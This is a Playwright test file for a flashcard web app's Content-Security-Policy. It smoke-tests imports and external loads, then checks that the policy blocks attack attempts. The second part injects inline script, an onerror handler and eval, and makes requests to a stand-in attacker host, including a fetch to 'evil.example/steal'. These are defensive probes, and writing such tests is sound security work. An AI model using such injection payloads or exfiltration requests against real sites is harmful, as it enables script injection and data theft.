// Content-Security-Policy (index.html): a smoke run through everything that loads something from outside the app (maths, Anki files with
// sql.js, Excel, PDF and slides, export, the sync address, the captcha frame) while every `securitypolicyviolation` event is collected.
// Any one fails the file. (pw.mjs also fails every other test file on a violation.) A second window proves the policy is really on
// by trying what it must refuse.
import { chromium } from './pw.mjs';
const SP = process.argv[2];
const browser = await chromium.launch();
const ok = (c, msg) => { console.log((c ? 'PASS ' : 'FAIL ') + msg); if (!c) process.exitCode = 1; };
const collect = ctx => ctx.addInitScript(() => {
  window.__csp = [];
  document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective}: ${e.blockedURI}`));
});

const ctx = await browser.newContext({ viewport: { width: 375, height: 740 }, acceptDownloads: true });
await collect(ctx);
const page = await ctx.newPage();
const errors = [];
page.on('pageerror', e => errors.push(String(e.stack || e.message)));
await page.goto('http://localhost:8123/#/decks'); await page.waitForSelector('.deck');
ok(await page.evaluate(() => !!document.querySelector('meta[http-equiv="Content-Security-Policy"]')), 'the page has a Content-Security-Policy');
ok(await page.evaluate(() => getComputedStyle(document.body).fontFamily.startsWith('Geist')) && await page.evaluate(() => document.fonts.check('16px Geist')), 'Geist comes from this site');
const fontFiles = await page.evaluate(() => performance.getEntriesByType('resource').map(r => r.name).filter(n => /woff2/.test(n)));
ok(fontFiles.length > 0 && fontFiles.every(n => n.startsWith('http://localhost:8123/fonts/')), 'font files are all under /fonts/: ' + fontFiles.map(f => f.split('/').pop()).join(','));
ok(await page.evaluate(() => performance.getEntriesByType('resource').every(r => !/googleapis|gstatic/.test(r.name))), 'nothing is fetched from Google');

// every tab and the main screens
for (const hash of ['today', 'decks', 'play', 'stats', 'settings', 'import']) {
  await page.goto('http://localhost:8123/#/' + hash); await page.waitForTimeout(400);
}
// maths: KaTeX (module from a blob or the CDN, stylesheet and fonts from the CDN)
await page.evaluate(async () => {
  const db = await import('./js/db.js');
  await db.addDeckWithCards({ id: 'csp', name: 'CSP', color: '#3E63DD', created: Date.now() }, [
    { id: 'c0', deckId: 'csp', front: 'Area of a circle $\\pi r^2$', back: '$$E=mc^2$$', tags: [], created: 1 }]);
});
await page.goto('http://localhost:8123/#/deck/csp'); await page.waitForSelector('.crow');
await page.goto('http://localhost:8123/#/review/csp');
await page.waitForFunction(() => document.querySelector('.katex'), null, { timeout: 30000 });
ok(true, 'maths is drawn (KaTeX)');
// Anki file: sql.js script from a blob and its WebAssembly
await page.goto('http://localhost:8123/#/import'); await page.waitForSelector('#tab-file'); await page.click('#tab-file');
await page.setInputFiles('#fileIn', SP + '/files/anki-new.apkg');
await page.waitForFunction(() => document.querySelector('#found')?.textContent.includes('Found 7 cards'), null, { timeout: 30000 });
ok(true, 'an Anki file opens (sql.js, WebAssembly)');
// Excel (SheetJS), slides (fflate) and PDF (pdf.js and its worker)
await page.setInputFiles('#fileIn', SP + '/files/chem.xlsx');
await page.waitForFunction(() => /Found \d+ card/.test(document.querySelector('#found')?.textContent || ''), null, { timeout: 30000 });
ok(true, 'an Excel file opens (SheetJS)');
await page.setInputFiles('#fileIn', SP + '/files/doc-slides.pptx');
await page.waitForFunction(() => !document.querySelector('#docBox')?.hidden, null, { timeout: 30000 });
ok(true, 'a PowerPoint file opens (fflate)');
await page.setInputFiles('#fileIn', SP + '/files/doc-text.pdf');
await page.waitForFunction(() => !document.querySelector('#docBox')?.hidden && /page/i.test(document.querySelector('#docBox')?.textContent || ''), null, { timeout: 60000 });
ok(true, 'a PDF opens (pdf.js and its worker)');
// the sync address (a failing request is fine: it must not be a policy refusal)
await page.evaluate(async () => { try { await fetch('https://lakxeftzlpvydzulxrbi.supabase.co/auth/v1/health', { mode: 'no-cors' }); } catch { /* offline is fine */ } });
// the captcha frame
await page.evaluate(() => new Promise(done => {
  const f = document.createElement('iframe');
  f.sandbox = 'allow-scripts'; f.src = 'js/captcha-frame.html?p=turnstile&k=1x00000000000000000000AA';
  f.onload = () => setTimeout(done, 500); document.body.append(f);
}));
await page.waitForTimeout(800);
const seen = await page.evaluate(() => window.__csp);
ok(seen.length === 0, 'no Content-Security-Policy violation in the smoke run' + (seen.length ? ': ' + seen.join(' | ') : ''));
const mine = errors.filter(e => !e.includes('challenges.cloudflare.com'));       // (Cloudflare's own challenge page has errors of its own when run in a sandbox)
ok(mine.length === 0, 'no page errors' + (mine.length ? ': ' + mine.join(' | ') : ''));
await ctx.close();

// The policy is really on: what it must refuse is refused (and reported).
const ctx2 = await browser.newContext({ viewport: { width: 375, height: 740 } });
ctx2.expectCspViolations = true;
await collect(ctx2);
const p2 = await ctx2.newPage();
await p2.goto('http://localhost:8123/#/decks'); await p2.waitForSelector('.deck');
const refused = await p2.evaluate(async () => {
  const ran = {};
  window.__mark = k => { ran[k] = true; };
  const s1 = document.createElement('script'); s1.textContent = "window.__mark('inline')"; document.head.append(s1);                // inline script
  const s2 = document.createElement('script'); s2.src = 'https://evil.example/x.js'; document.head.append(s2);                       // another site's script
  const d = document.createElement('div'); d.innerHTML = '<img src="x" onerror="window.__mark(\'handler\')">'; document.body.append(d);   // inline handler
  const i = document.createElement('img'); i.src = 'https://evil.example/pixel.png'; document.body.append(i);                      // picture from another site
  try { await fetch('https://evil.example/steal'); } catch { /* refused */ }                                                          // a request to another site
  await new Promise(r => setTimeout(r, 500));
  // (eval is tried after a pause: the test tool lets the first moment of what it runs use eval)
  try { eval("window.__mark('eval')"); } catch (e) { window.__evalErr = String(e).slice(0, 80); }                                                                      // eval
  return { ran: Object.keys(ran), events: window.__csp, evalErr: window.__evalErr };
});
ok(refused.ran.length === 0, 'inline scripts, handlers and eval do not run' + (refused.ran.length ? ' (ran: ' + refused.ran + ')' : ''));
ok(refused.evalErr?.includes('EvalError') && ['script-src', 'img-src', 'connect-src'].every(d => refused.events.some(e => e.startsWith(d))), 'and each is reported: ' + refused.events.join(' | '));
await browser.close();
